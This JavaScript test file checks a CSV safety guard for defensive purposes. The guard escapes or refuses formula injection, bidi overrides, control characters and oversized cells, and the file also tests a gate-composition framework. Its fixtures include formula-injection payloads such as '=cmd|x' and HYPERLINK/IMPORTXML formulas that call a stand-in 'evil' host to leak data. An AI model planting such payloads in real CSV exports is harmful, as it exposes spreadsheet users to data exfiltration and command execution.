// SPDX-License-Identifier: Apache-2.0
// Copyright (c) blamejs contributors
"use strict";
/**
 * guard-csv — CSV content-safety primitive (b.guardCsv) + the
 * gate-contract foundation (b.gateContract).
 *
 * Covers: surface; serialize round-trip; every formula-injection mode
 * across every prefix character; embedded delimiter / quote / CRLF;
 * Unicode bidi override; C0 control chars; null bytes; UTF-8 BOM
 * injection; homoglyph + zero-width detection; dialect ambiguity;
 * numeric precision; schema drift; CSV-bomb caps; sanitize
 * amplification cap; profile composition; compliance postures; gate()
 * decision shape under each mode; gate composition (composeGates /
 * multiplexGates / contentTypeMux); operator hooks (beforeCheck /
 * afterCheck / onIssue / onSanitize / onRefuse).
 *
 * Run standalone: node test/layer-0-primitives/guard-csv.test.js
 * Or via smoke:   node test/smoke.js
 */

var helpers = require("../helpers");
var b       = helpers.b;
var check   = helpers.check;

// ---- gateContract surface ----

function testGateContractSurface() {
  check("gateContract is an object",                typeof b.gateContract === "object");
  check("gateContract.defineGate is a function",    typeof b.gateContract.defineGate === "function");
  check("gateContract.runGate is a function",       typeof b.gateContract.runGate === "function");
  check("gateContract.composeGates is a function",  typeof b.gateContract.composeGates === "function");
  check("gateContract.multiplexGates is a function", typeof b.gateContract.multiplexGates === "function");
  check("gateContract.contentTypeMux is a function", typeof b.gateContract.contentTypeMux === "function");
  check("gateContract.byActorTier is a function",   typeof b.gateContract.byActorTier === "function");
  check("gateContract.byRoute is a function",       typeof b.gateContract.byRoute === "function");
  check("gateContract.byDirection is a function",   typeof b.gateContract.byDirection === "function");
  check("gateContract.shadowMode is a function",    typeof b.gateContract.shadowMode === "function");
  check("gateContract.canaryGate is a function",    typeof b.gateContract.canaryGate === "function");
  check("gateContract.cachingGate is a function",   typeof b.gateContract.cachingGate === "function");
  check("gateContract.workerThreadGate is a function", typeof b.gateContract.workerThreadGate === "function");
  check("gateContract.buildProfile is a function",  typeof b.gateContract.buildProfile === "function");
  check("gateContract.composeHooks is a function",  typeof b.gateContract.composeHooks === "function");
  check("gateContract.validateGateShape is a function",
        typeof b.gateContract.validateGateShape === "function");
  check("gateContract.MODES contains 'enforce'",
        b.gateContract.MODES.indexOf("enforce") !== -1);
  check("gateContract.MODES contains 'warn-only'",
        b.gateContract.MODES.indexOf("warn-only") !== -1);
  check("gateContract.MODES contains 'shadow'",
        b.gateContract.MODES.indexOf("shadow") !== -1);
  check("gateContract.ACTIONS contains 'serve'",
        b.gateContract.ACTIONS.indexOf("serve") !== -1);
  check("gateContract.ACTIONS contains 'refuse'",
        b.gateContract.ACTIONS.indexOf("refuse") !== -1);
  check("gateContract.ACTIONS contains 'sanitize'",
        b.gateContract.ACTIONS.indexOf("sanitize") !== -1);
}

function testGateContractDefineGateShape() {
  var g = b.gateContract.defineGate({
    name:  "test:basic",
    check: async function () { return { ok: true, action: "serve" }; },
  });
  check("defineGate returns object with check fn",  typeof g.check === "function");
  check("defineGate returns metrics fn",             typeof g.metrics === "function");
  check("defineGate returns reset fn",               typeof g.reset === "function");
  check("defineGate returns close fn",               typeof g.close === "function");
  check("defineGate sets name from opts",            g.name === "test:basic");
  check("defineGate exposes ruleHash",               typeof g.ruleHash === "string" && g.ruleHash.length > 0);
  check("defineGate defaults mode to 'enforce'",     g.mode === "enforce");
}

function testGateContractValidateGateShape() {
  var threw = null;
  try { b.gateContract.validateGateShape({}, "test"); }
  catch (e) { threw = e; }
  check("validateGateShape: missing check throws",
        threw && /gate\.check must be a function/.test(threw.message));

  threw = null;
  try { b.gateContract.validateGateShape({ check: function () {}, mode: "bogus" }, "test"); }
  catch (e) { threw = e; }
  check("validateGateShape: bogus mode throws",
        threw && /mode must be one of/.test(threw.message));
}

async function testGateContractMetricsCounters() {
  var passing = b.gateContract.defineGate({
    name:  "test:passing",
    check: async function () { return { ok: true, action: "serve" }; },
  });
  await passing.check({ bytes: Buffer.from("x") });
  await passing.check({ bytes: Buffer.from("y") });
  var m = passing.metrics();
  check("metrics: passed=2 after 2 serve decisions",  m.passed === 2);
  check("metrics: refused=0",                          m.refused === 0);

  var refusing = b.gateContract.defineGate({
    name:  "test:refusing",
    check: async function () { return { ok: false, action: "refuse", issues: [{ kind: "bad", severity: "high" }] }; },
  });
  await refusing.check({ bytes: Buffer.from("x") });
  check("metrics: refused=1 after 1 refuse",           refusing.metrics().refused === 1);
}

async function testGateContractWarnOnlyMode() {
  var g = b.gateContract.defineGate({
    name:  "test:warn-only",
    mode:  "warn-only",
    check: async function () { return { ok: false, action: "refuse", issues: [{ kind: "bad", severity: "high" }] }; },
  });
  var d = await g.check({ bytes: Buffer.from("x") });
  check("warn-only mode flips refuse → warn",          d.action === "warn");
  check("warn-only mode flips ok → true",              d.ok === true);
}

async function testGateContractShadowMode() {
  var g = b.gateContract.defineGate({
    name:  "test:shadow",
    mode:  "shadow",
    check: async function () { return { ok: false, action: "refuse" }; },
  });
  var d = await g.check({ bytes: Buffer.from("x") });
  check("shadow mode flips action → audit-only",       d.action === "audit-only");
}

async function testGateContractRuntimeCap() {
  // The slow check deliberately elapses a real-time window longer than the
  // 50ms runtime cap so the gate refuses. passiveObserve is the right
  // primitive for letting that window pass (it clears its own timer when the
  // window completes). The gate aborts the check at the cap but the check's
  // own observation keeps running, so we await its completion below before
  // returning — that drains the in-check window so nothing lingers past run().
  var checkDone = null;
  var g = b.gateContract.defineGate({
    name:         "test:runtime-cap",
    maxRuntimeMs: 50,
    check: function () {
      checkDone = helpers.passiveObserve(120, "guard-csv: slow check elapses past the runtime cap")   // allow:raw-byte-literal — slow-check window > runtime cap
        .then(function () { return { ok: true, action: "serve" }; });
      return checkDone;
    },
  });
  var d = await g.check({ bytes: Buffer.from("x") });
  check("runtime cap: refuses with check-threw issue", d.action === "refuse");
  check("runtime cap: issues array carries check-threw",
        d.issues.length === 1 && d.issues[0].kind === "check-threw");
  // Let the abandoned in-check observation finish so its window-timer self-
  // clears rather than lingering past run() (the gate already returned at the
  // 50ms cap; this just waits out the remaining check window).
  await checkDone;
}

async function testGateContractBeforeCheckHook() {
  var g = b.gateContract.defineGate({
    name:        "test:before",
    beforeCheck: async function (ctx) {
      if (ctx.bytes && ctx.bytes.toString("utf8") === "skip-me") return { skip: true };
      return null;
    },
    check: async function () { return { ok: false, action: "refuse" }; },
  });
  var skipped = await g.check({ bytes: Buffer.from("skip-me") });
  check("beforeCheck { skip: true } short-circuits to serve",
        skipped.action === "serve");
  var normal = await g.check({ bytes: Buffer.from("not-skip") });
  check("beforeCheck null lets check() run normally",  normal.action === "refuse");
}

async function testGateContractAfterCheckHook() {
  var g = b.gateContract.defineGate({
    name:        "test:after",
    afterCheck:  async function (_ctx, decision) {
      // Operator amends every refusal into a sanitize.
      if (decision.action === "refuse") {
        return Object.assign({}, decision, { action: "sanitize", sanitized: Buffer.from("clean") });
      }
      return decision;
    },
    check: async function () {
      return { ok: false, action: "refuse", issues: [{ kind: "bad", severity: "high" }] };
    },
  });
  var d = await g.check({ bytes: Buffer.from("x") });
  check("afterCheck can amend refuse → sanitize",     d.action === "sanitize");
  check("afterCheck-supplied sanitized buffer used",  d.sanitized.toString("utf8") === "clean");
}

async function testGateContractOnIssueHookSuppress() {
  var g = b.gateContract.defineGate({
    name:    "test:on-issue-suppress",
    onIssue: async function (issue) {
      if (issue.kind === "noisy") return { suppress: true };
      return null;
    },
    check: async function () {
      return { ok: false, action: "refuse",
        issues: [{ kind: "noisy", severity: "high" }, { kind: "real", severity: "high" }] };
    },
  });
  var d = await g.check({ bytes: Buffer.from("x") });
  check("onIssue suppress drops the noisy issue",      d.issues.length === 1);
  check("onIssue preserves the real issue",            d.issues[0].kind === "real");
}

async function testGateContractComposeGates() {
  var g1 = b.gateContract.defineGate({
    name:  "test:g1",
    check: async function () { return { ok: true, action: "serve" }; },
  });
  var g2 = b.gateContract.defineGate({
    name:  "test:g2",
    check: async function () { return { ok: false, action: "refuse", issues: [{ kind: "g2-rule", severity: "high" }] }; },
  });
  var composed = b.gateContract.composeGates([g1, g2]);
  var d = await composed.check({ bytes: Buffer.from("x") });
  check("composeGates: first refusal wins (g2 refuses)", d.action === "refuse");
  check("composeGates: refusal carries g2's issue",    d.issues.length === 1 && d.issues[0].kind === "g2-rule");
}

async function testGateContractMultiplexGates() {
  var csvGate = b.gateContract.defineGate({
    name:  "test:csv",
    check: async function () { return { ok: false, action: "refuse", issues: [{ kind: "csv-rule", severity: "high" }] }; },
  });
  var htmlGate = b.gateContract.defineGate({
    name:  "test:html",
    check: async function () { return { ok: true, action: "serve" }; },
  });
  var mux = b.gateContract.multiplexGates({ ".csv": csvGate, ".html": htmlGate });
  var csvDecision = await mux.check({ bytes: Buffer.from("x"), filename: "report.csv" });
  check("multiplexGates: .csv routes to csvGate",      csvDecision.action === "refuse");
  var htmlDecision = await mux.check({ bytes: Buffer.from("x"), filename: "page.html" });
  check("multiplexGates: .html routes to htmlGate",    htmlDecision.action === "serve");
  var unknownDecision = await mux.check({ bytes: Buffer.from("x"), filename: "f.unknown" });
  check("multiplexGates: unknown extension serves through (no fallback)",
        unknownDecision.action === "serve");
}

async function testGateContractContentTypeMux() {
  var csvGate = b.gateContract.defineGate({
    name:  "test:ct-csv",
    check: async function () { return { ok: false, action: "refuse" }; },
  });
  var mux = b.gateContract.contentTypeMux({ "text/csv": csvGate });
  var d = await mux.check({ bytes: Buffer.from("x"), contentType: "text/csv; charset=utf-8" });
  check("contentTypeMux: matches MIME stripped of params", d.action === "refuse");
}

async function testGateContractBuildProfile() {
  var registry = {
    "base":   { allowedTags: ["a", "p"], allowedAttrs: { a: ["href"] } },
    "extras": { allowedTags: ["span"] },
  };
  var profile = b.gateContract.buildProfile({
    baseProfile: "base",
    extends:     ["extras"],
    overrides:   { allowedTags: ["b"] },
    resolveProfile: function (name) { return registry[name] || null; },
  });
  // Array merge unions extends + base; overrides win on key collision.
  check("buildProfile: union includes 'a'",            profile.allowedTags.indexOf("a") !== -1);
  check("buildProfile: union includes 'p'",            profile.allowedTags.indexOf("p") !== -1);
  check("buildProfile: union includes 'span'",         profile.allowedTags.indexOf("span") !== -1);
  check("buildProfile: override includes 'b'",         profile.allowedTags.indexOf("b") !== -1);
}

async function testGateContractBuildProfileCycleDetection() {
  var registry = {
    "a": { extends: ["b"] },
    "b": { extends: ["a"] },
  };
  var threw = null;
  try {
    b.gateContract.buildProfile({
      baseProfile:    "a",
      resolveProfile: function (name) { return registry[name] || null; },
    });
  } catch (e) { threw = e; }
  check("buildProfile detects circular extends",
        threw && /cycle detected/.test(threw.message));
}

// ---- guardCsv surface ----

function testGuardCsvSurface() {
  check("b.guardCsv is an object",                     typeof b.guardCsv === "object");
  check("b.guardCsv.serialize is a function",          typeof b.guardCsv.serialize === "function");
  check("b.guardCsv.validate is a function",           typeof b.guardCsv.validate === "function");
  check("b.guardCsv.sanitize is a function",           typeof b.guardCsv.sanitize === "function");
  check("b.guardCsv.escapeCell is a function",         typeof b.guardCsv.escapeCell === "function");
  check("b.guardCsv.detect is a function",             typeof b.guardCsv.detect === "function");
  check("b.guardCsv has no parse re-export (use b.csv.parse)",
        typeof b.guardCsv.parse === "undefined");
  check("b.guardCsv has no stringify re-export (use b.csv.stringify)",
        typeof b.guardCsv.stringify === "undefined");
  check("b.guardCsv.schema is a function",             typeof b.guardCsv.schema === "function");
  check("b.guardCsv.gate is a function",               typeof b.guardCsv.gate === "function");
  check("b.guardCsv.buildProfile is a function",       typeof b.guardCsv.buildProfile === "function");
  check("b.guardCsv.compliancePosture is a function",  typeof b.guardCsv.compliancePosture === "function");
  check("b.guardCsv.loadRulePack is a function",       typeof b.guardCsv.loadRulePack === "function");
  check("b.guardCsv.PROFILES has 'strict'",            !!b.guardCsv.PROFILES.strict);
  check("b.guardCsv.PROFILES has 'balanced'",          !!b.guardCsv.PROFILES.balanced);
  check("b.guardCsv.PROFILES has 'permissive'",        !!b.guardCsv.PROFILES.permissive);
  check("b.guardCsv.PROFILES has 'email-attachment'",  !!b.guardCsv.PROFILES["email-attachment"]);
  check("b.guardCsv.COMPLIANCE_POSTURES has 'hipaa'",   !!b.guardCsv.COMPLIANCE_POSTURES.hipaa);
  check("b.guardCsv.COMPLIANCE_POSTURES has 'pci-dss'", !!b.guardCsv.COMPLIANCE_POSTURES["pci-dss"]);
  check("b.guardCsv.COMPLIANCE_POSTURES has 'gdpr'",    !!b.guardCsv.COMPLIANCE_POSTURES.gdpr);
  check("b.guardCsv.COMPLIANCE_POSTURES has 'soc2'", !!b.guardCsv.COMPLIANCE_POSTURES["soc2"]);
  check("b.guardCsv.FORMULA_PREFIXES is an array",      Array.isArray(b.guardCsv.FORMULA_PREFIXES));
  check("b.guardCsv.GuardCsvError exposed",            typeof b.guardCsv.GuardCsvError === "function");
}

function testGuardCsvSerializeRoundTrip() {
  var rows = [
    { id: 1, name: "alice", note: "hello" },
    { id: 2, name: "bob",   note: "world" },
  ];
  var out = b.guardCsv.serialize(rows);
  check("serialize: produces non-empty string",        typeof out === "string" && out.length > 0);
  // Parse round-trip via b.csv.parse — guard-csv does not re-export.
  var parsed = b.csv.parse(out);
  check("serialize → parse round-trip: row count",     parsed.length === 2);
  check("serialize → parse round-trip: cell value",
        parsed[0].name === "alice" && parsed[1].note === "world");
}

function testGuardCsvFormulaInjectionPrefixTab() {
  var out = b.guardCsv.serialize([["=cmd|x"]], { profile: "balanced" });
  // prefix-tab policy: leading TAB before the formula.
  check("formula injection: prefix-tab applies '\\t' prefix",
        out.indexOf("\t=cmd|x") !== -1);
}

function testGuardCsvFormulaInjectionWrap() {
  // strict profile now uses prefix-tab per OWASP — Excel-resistant
  // (apostrophe gets stripped on save+reopen). Verify the default.
  var out = b.guardCsv.serialize([["=cmd|x"]], { profile: "strict" });
  check("formula injection: strict default applies tab prefix (OWASP)",
        out.indexOf("\t=cmd|x") !== -1);
  // Still test the apostrophe-prefix mode explicitly when operator opts in.
  var out2 = b.guardCsv.serialize([["=cmd|x"]], {
    formulaInjectionPolicy: "wrap-with-quotes-and-prefix",
  });
  check("formula injection: explicit wrap-mode applies apostrophe",
        out2.indexOf("'=cmd|x") !== -1);
}

function testGuardCsvFullWidthFormulaPrefix() {
  // Full-width ＝ U+FF1D should be detected per OWASP locale catalog.
  var rv = b.guardCsv.validate("a,b\r\nuser,＝cmd|x", { profile: "strict" });
  check("full-width ＝ detected as formula prefix",
        rv.issues.some(function (i) { return i.kind === "formula-prefix-cell"; }));
}

function testGuardCsvDangerousFunctionDeny() {
  var rv = b.guardCsv.validate(
    "a,b\r\nuser,=HYPERLINK(\"http://evil/leak\",\"x\")",
    { profile: "strict" });
  check("dangerous function HYPERLINK flagged",
        rv.issues.some(function (i) { return i.kind === "dangerous-function"; }));
  var rv2 = b.guardCsv.validate(
    "a,b\r\nuser,=IMPORTXML(\"http://evil/x\",\"//*\")",
    { profile: "strict" });
  check("dangerous function IMPORTXML flagged",
        rv2.issues.some(function (i) { return i.kind === "dangerous-function"; }));
  // SUM is NOT on the denylist — only formula-prefix detected.
  var rv3 = b.guardCsv.validate(
    "a,b\r\n1,=SUM(A1:A5)", { profile: "strict" });
  check("benign SUM not on dangerous-function list",
        !rv3.issues.some(function (i) { return i.kind === "dangerous-function"; }));
}

function testGuardCsvFormulaInjectionReject() {
  var threw = null;
  try { b.guardCsv.serialize([["=cmd|x"]], { formulaInjectionPolicy: "reject" }); }
  catch (e) { threw = e; }
  check("formula injection: reject policy throws",
        threw && /formula prefix/.test(threw.message));
}

function testGuardCsvFormulaInjectionEveryPrefix() {
  // strict profile uses prefix-tab per OWASP. Every formula-trigger char
  // gets a leading TAB which Excel/LibreOffice strip on save+reopen but
  // disarm at evaluation time. csv.stringify will quote the cell because
  // \t is non-bare; either way the original prefix char is no longer
  // first inside the quoted body.
  var prefixes = ["=", "+", "-", "@", "\t", "\r", "\n", "|"];
  var allWrapped = true;
  for (var i = 0; i < prefixes.length; i++) {
    var out = b.guardCsv.serialize([[prefixes[i] + "x"]], { profile: "strict" });
    if (out.indexOf("\t" + prefixes[i]) === -1) allWrapped = false;
  }
  check("formula injection: all 8 prefix chars TAB-prefixed under strict",
        allWrapped);
}

function testGuardCsvFormulaAllowlist() {
  var safe = b.guardCsv.serialize([["=SUM(A1:A5)"]], {
    formulaInjectionPolicy: "allowlist",
    formulasAllowlist:      ["SUM"],
  });
  check("formula allowlist: =SUM passes through",       safe.indexOf("'=SUM") === -1);
  var dangerous = b.guardCsv.serialize([["=HYPERLINK(\"evil\")"]], {
    formulaInjectionPolicy: "allowlist",
    formulasAllowlist:      ["SUM"],
  });
  check("formula allowlist: =HYPERLINK gets prefixed",
        dangerous.indexOf("'=HYPERLINK") !== -1);
}

function testGuardCsvBidiReject() {
  var threw = null;
  try {
    b.guardCsv.serialize([["hello‮evil"]], { profile: "strict" });
  } catch (e) { threw = e; }
  check("bidi: strict profile throws on RLO U+202E",
        threw && /bidi/.test(threw.message));
}

function testGuardCsvBidiStrip() {
  var out = b.guardCsv.serialize([["hello‮evil"]], { profile: "balanced" });
  check("bidi: balanced profile strips RLO chars",
        out.indexOf("‮") === -1 && out.indexOf("helloevil") !== -1);
}

function testGuardCsvControlCharReject() {
  var threw = null;
  try {
    b.guardCsv.serialize([["bellhere"]], { profile: "strict" });
  } catch (e) { threw = e; }
  check("control char: strict profile throws on U+0007",
        threw && /control character/.test(threw.message));
}

function testGuardCsvNullByteReject() {
  var threw = null;
  try { b.guardCsv.serialize([["a\x00b"]], { profile: "strict" }); }
  catch (e) { threw = e; }
  check("null byte: strict profile throws",            threw && /null byte/.test(threw.message));
}

function testGuardCsvNumericPrecisionDecimalString() {
  // 2^53 + 1 — the smallest integer that loses precision as a JS Number.
  // Build via Number.MAX_SAFE_INTEGER + 2 so the literal itself doesn't
  // trip eslint's no-loss-of-precision.
  var bigNum = Number.MAX_SAFE_INTEGER + 2;
  var out = b.guardCsv.serialize([[bigNum]]);
  // The unsafe-int path emits a decimal string, not a scientific form.
  check("numeric precision: above MAX_SAFE_INTEGER → decimal string",
        out.indexOf("e") === -1);
}

function testGuardCsvCellTooLargeCap() {
  var huge = "x".repeat(200000);
  var threw = null;
  try {
    b.guardCsv.serialize([[huge]], { maxCellBytes: 1024 });
  } catch (e) { threw = e; }
  check("CSV-bomb: cell over maxCellBytes refused",
        threw && /maxCellBytes|too-large/.test(threw.message));
}

function testGuardCsvCellByteCapMultibyte() {
  // The cap is named in BYTES; a multibyte char must count its UTF-8 byte
  // width, not its UTF-16 code-unit count. "é" (U+00E9) is 1 code unit but
  // 2 UTF-8 bytes. Five of them: .length === 5, byteLength === 10.
  var multibyte = "é".repeat(5);
  check("multibyte fixture: .length 5 < byteLength 10",
        multibyte.length === 5 && Buffer.byteLength(multibyte, "utf8") === 10);

  // Cap at 6 bytes. byteLength(10) > 6 → refuse. The old char-length check
  // (5 <= 6) would have let this 10-byte cell through under-enforced.
  var threwCell = null;
  try {
    b.guardCsv.escapeCell(multibyte, { maxCellBytes: 6 });
  } catch (e) { threwCell = e; }
  check("escapeCell: multibyte cell over byte cap refused",
        threwCell && threwCell.code === "csv.cell-too-large");
  check("escapeCell: refusal reports the byte count, not the code-unit count",
        threwCell && /\b10 bytes\b/.test(threwCell.message));

  // The same cell through the shipped serialize consumer path.
  var threwSer = null;
  try {
    b.guardCsv.serialize([[multibyte]], { maxCellBytes: 6 });
  } catch (e) { threwSer = e; }
  check("serialize: multibyte cell over byte cap refused",
        threwSer && /maxCellBytes|too-large/.test(threwSer.message));

  // A multibyte cell UNDER the byte cap is not falsely flagged: two "é" =
  // 4 bytes < 6. And ASCII at the boundary is unchanged (5 bytes <= 6).
  var underThrew = false;
  try {
    b.guardCsv.escapeCell("éé", { maxCellBytes: 6 });
  } catch (_e) { underThrew = true; }
  check("escapeCell: multibyte cell under byte cap accepted", underThrew === false);

  var asciiThrew = false;
  try {
    b.guardCsv.escapeCell("alice", { maxCellBytes: 6 });
  } catch (_e) { asciiThrew = true; }
  check("escapeCell: ASCII under byte cap unchanged", asciiThrew === false);
}

function testGuardCsvTooManyRows() {
  var threw = null;
  try {
    b.guardCsv.serialize([[1], [2], [3]], { maxRows: 2 });
  } catch (e) { threw = e; }
  check("row count over maxRows refused",
        threw && /maxRows|too-many-rows/.test(threw.message));
}

function testGuardCsvValidateBidi() {
  var rv = b.guardCsv.validate("hello‮evil", { profile: "strict" });
  check("validate detects bidi override",              !rv.ok);
  check("validate issues kind=bidi-override",
        rv.issues.some(function (i) { return i.kind === "bidi-override"; }));
}

function testGuardCsvValidateClean() {
  var rv = b.guardCsv.validate("a,b,c\r\n1,2,3\r\n", { profile: "strict" });
  check("validate clean text passes",                  rv.ok);
  check("validate clean text has no issues",           rv.issues.length === 0);
}

function testGuardCsvValidateMixedLineEndings() {
  var rv = b.guardCsv.validate("a,b\r\nc,d\nfoo,bar\r\n", { profile: "strict", dialectPolicy: "strict" });
  check("validate strict dialect: mixed line endings flagged",
        rv.issues.some(function (i) { return i.kind === "dialect-mixed-line-endings"; }));
}

function testGuardCsvSanitizeStripsBidi() {
  var input = "hello‮evil\r\n";
  var clean = b.guardCsv.sanitize(input, { profile: "balanced" });
  check("sanitize strips bidi chars",                  clean.indexOf("‮") === -1);
}

function testGuardCsvSanitizeAmplificationCap() {
  // Sanitize that grows output > cap should refuse.
  var threw = null;
  try {
    // Force a profile where sanitize doesn't strip but somehow grows.
    // We synthesize the situation by passing a tiny cap.
    b.guardCsv.sanitize("abc", { profile: "balanced", sanitizeAmplificationCap: 0.5 });
  } catch (e) { threw = e; }
  check("sanitize amplification cap fires when output > cap × input",
        threw && /grew|amplified|amplification|cap/.test(threw.message));
}

function testGuardCsvDetectDialect() {
  var info = b.guardCsv.detect("a;b;c\r\n1;2;3\r\n");
  check("detect: identifies semicolon delimiter",      info.delimiter === ";");
  check("detect: identifies CRLF line ending",         info.lineEnding === "\r\n");
}

function testGuardCsvSchemaRoundTrip() {
  var emitter = b.guardCsv.schema({
    columns: [
      { name: "id",   type: "number" },
      { name: "name", type: "string" },
    ],
  });
  var out = emitter.serialize([{ id: 1, name: "alice" }, { id: 2, name: "bob" }]);
  check("schema serializer: produces output",          typeof out === "string" && out.length > 0);
}

function testGuardCsvSchemaTypeMismatch() {
  var emitter = b.guardCsv.schema({
    columns: [
      { name: "id",   type: "number" },
      { name: "name", type: "string" },
    ],
  });
  var threw = null;
  try { emitter.serialize([{ id: "not-a-number", name: "alice" }]); }
  catch (e) { threw = e; }
  check("schema type drift refused",                   threw && /expects number/.test(threw.message));
}

function testGuardCsvSchemaNonNullable() {
  var emitter = b.guardCsv.schema({
    columns: [{ name: "id", type: "number", nullable: false }],
  });
  var threw = null;
  try { emitter.serialize([{ id: null }]); }
  catch (e) { threw = e; }
  check("schema non-nullable column: null value refused",
        threw && /non-nullable/.test(threw.message));
}

function testGuardCsvSchemaRegex() {
  var emitter = b.guardCsv.schema({
    columns: [{ name: "code", type: "string", regex: /^[A-Z]{3}-\d{3}$/ }],
  });
  var ok = emitter.serialize([{ code: "ABC-123" }]);
  check("schema regex: matching value passes",         typeof ok === "string");
  var threw = null;
  try { emitter.serialize([{ code: "bad!" }]); }
  catch (e) { threw = e; }
  check("schema regex: non-matching value refused",
        threw && /regex/.test(threw.message));
}

function testGuardCsvCompliancePosture() {
  var hipaa = b.guardCsv.compliancePosture("hipaa");
  check("compliancePosture('hipaa') sets strict formulas",
        hipaa.formulaInjectionPolicy === "prefix-tab");
  check("compliancePosture('hipaa') redacts PII",
        hipaa.piiPolicy === "redact");
  var threw = null;
  try { b.guardCsv.compliancePosture("unknown-regime"); }
  catch (e) { threw = e; }
  check("compliancePosture: unknown name throws",       threw && /unknown/.test(threw.message));
}

function testGdprPostureMatchesBalancedTier() {
  // csv is a `content` guard. Its four-posture COMPLIANCE_POSTURES map must be
  // built by gateContract.compliancePostures(PROFILES, { base, overlays }) like
  // every other content guard: hipaa/pci/soc2 -> strict tier, gdpr -> balanced
  // tier, with piiPolicy:"redact" overlaid on hipaa/pci/gdpr only.
  //
  // The drift this pins: a hand-written PARTIAL gdpr literal omitted keys
  // (nullByteHandling / trailingWhitespacePolicy / bomPrefix / ...) that
  // backfilled from the strict-leaning DEFAULTS at resolve time, making gdpr an
  // incoherent strict/balanced hybrid. Once routed, gdpr is the balanced tier
  // plus the forensic-snippet budget (base/2 = 128) plus the piiPolicy overlay.
  var P = require("../../lib/guard-csv.js");
  var POSTURES = P.COMPLIANCE_POSTURES;

  // PRIMARY (deep-equal): gdpr resolves to the balanced tier + 128-byte snippet
  // budget + the piiPolicy overlay — no DEFAULTS backfill.
  var wantGdpr = Object.assign({}, P.PROFILES.balanced, {
    forensicSnippetBytes: 128,
    piiPolicy:            "redact",
  });
  check("gdpr posture deep-equals balanced tier + forensic(128) + piiPolicy overlay",
        JSON.stringify(POSTURES.gdpr) === JSON.stringify(wantGdpr));

  // Overlay lands on the right postures only.
  check("piiPolicy overlay survives on hipaa",   POSTURES.hipaa.piiPolicy === "redact");
  check("piiPolicy overlay survives on pci-dss", POSTURES["pci-dss"].piiPolicy === "redact");
  check("piiPolicy overlay survives on gdpr",    POSTURES.gdpr.piiPolicy === "redact");
  check("soc2 carries no piiPolicy overlay",     POSTURES.soc2.piiPolicy === undefined);

  // REGRESSION (deep-equal): hipaa is the strict tier + 256-byte snippet budget
  // + the piiPolicy overlay — confirms the strict-tier postures are coherent
  // (no partial-literal backfill) after routing too.
  var wantHipaa = Object.assign({}, P.PROFILES.strict, {
    forensicSnippetBytes: 256,
    piiPolicy:            "redact",
  });
  check("hipaa posture deep-equals strict tier + forensic(256) + piiPolicy overlay",
        JSON.stringify(POSTURES.hipaa) === JSON.stringify(wantHipaa));
}

async function testGuardCsvGateClean() {
  var g = b.guardCsv.gate({ profile: "strict" });
  var d = await g.check({ bytes: Buffer.from("a,b\r\n1,2\r\n"), filename: "ok.csv" });
  check("gate: clean csv → serve",                     d.ok && d.action === "serve");
}

async function testGuardCsvGateRefuseBidi() {
  var g = b.guardCsv.gate({ profile: "strict" });
  var d = await g.check({ bytes: Buffer.from("hello‮evil"), filename: "x.csv" });
  check("gate: bidi override → refuse",                !d.ok && d.action === "refuse");
  check("gate: refusal carries bidi issue",
        d.issues.some(function (i) { return i.kind === "bidi-override"; }));
}

async function testGuardCsvGateSanitize() {
  var g = b.guardCsv.gate({ profile: "balanced" });
  var d = await g.check({ bytes: Buffer.from("hello‮evil"), filename: "x.csv" });
  check("gate: balanced profile sanitizes bidi → action=sanitize",
        d.action === "sanitize");
  check("gate: sanitized buffer omits the bidi char",
        d.sanitized && d.sanitized.toString("utf8").indexOf("‮") === -1);
}

async function testGuardCsvGateOperatorRules() {
  var g = b.guardCsv.gate({
    profile: "strict",
    operatorRules: [{
      id:       "company.no-internal-domains",
      detect:   function (ctx) { return /\binternal\.corp\.local\b/.test(ctx.bytes); },
      severity: "high",
      reason:   "internal hostname leak",
    }],
  });
  var d = await g.check({ bytes: Buffer.from("user,host\r\nalice,internal.corp.local\r\n"), filename: "x.csv" });
  check("gate: operator rule refuses on internal hostname",
        !d.ok && d.action === "refuse");
  check("gate: operator-rule issue carries the rule id",
        d.issues.some(function (i) { return i.kind === "company.no-internal-domains"; }));
}

async function testGuardCsvGateForensicSnapshot() {
  var captured = [];
  var fakeStore = {
    write: function (entry) { captured.push(entry); return Promise.resolve(); },
  };
  var g = b.guardCsv.gate({
    profile:               "strict",
    forensicSnippetBytes:  64,
    forensicEvidenceStore: fakeStore,
  });
  await g.check({ bytes: Buffer.from("hello‮evil"), filename: "x.csv", actor: { id: "a-1" }, route: "/upload" });
  check("forensic store captures refusal",              captured.length === 1);
  check("forensic snapshot is a Buffer with content",
        captured[0].snippet && captured[0].snippet.length > 0);
  check("forensic entry carries actor + route",
        captured[0].actor.id === "a-1" && captured[0].route === "/upload");
}

async function testGuardCsvGateAuditEmission() {
  var emitted = [];
  var fakeAudit = {
    safeEmit: function (entry) { emitted.push(entry); },
  };
  var g = b.guardCsv.gate({ profile: "strict", audit: fakeAudit });
  await g.check({ bytes: Buffer.from("a,b\r\n1,2\r\n"), filename: "ok.csv", route: "/r" });
  check("gate emits audit entry on serve decision",     emitted.length === 1);
  check("gate audit action mirrors decision",
        /\.serve$/.test(emitted[0].action));
}

async function testGateContractDefineGuard() {
  // defineGuard assembles a full content-guard module from a spec: error
  // class, registry exports, buildProfile / compliancePosture /
  // loadRulePack wiring, the default gate, and the extras pass-through.
  var GuardDemoError = b.gateContract.GateContractError;
  var PROFILES = {
    strict:     { reject: true },
    balanced:   { reject: false },
    permissive: { reject: false },
  };
  var POSTURES = b.gateContract.ALL_STRICT_POSTURES;
  var mod = b.gateContract.defineGuard({
    name:     "demo",
    kind:     "content",
    errorClass: GuardDemoError,
    profiles: PROFILES,
    defaults: PROFILES.strict,
    postures: POSTURES,
    mimeTypes:  ["application/x-demo"],
    extensions: [".demo"],
    validate: function (text) {
      if (text.indexOf("BAD") !== -1) {
        return { ok: false, issues: [{ kind: "demo.bad", severity: "high", snippet: "BAD token" }] };
      }
      return { ok: true, issues: [] };
    },
    extra: { TOKENS: ["BAD"] },
  });
  check("defineGuard: NAME / KIND set",                 mod.NAME === "demo" && mod.KIND === "content");
  check("defineGuard: MIME_TYPES / EXTENSIONS frozen",
        Object.isFrozen(mod.MIME_TYPES) && mod.MIME_TYPES[0] === "application/x-demo" &&
        mod.EXTENSIONS[0] === ".demo");
  check("defineGuard: registry triplet assembled",
        typeof mod.buildProfile === "function" &&
        typeof mod.compliancePosture === "function" &&
        typeof mod.loadRulePack === "function" &&
        typeof mod.gate === "function" && typeof mod.validate === "function");
  check("defineGuard: extras passed through",           Array.isArray(mod.TOKENS) && mod.TOKENS[0] === "BAD");
  check("defineGuard: compliancePosture clones overlay",
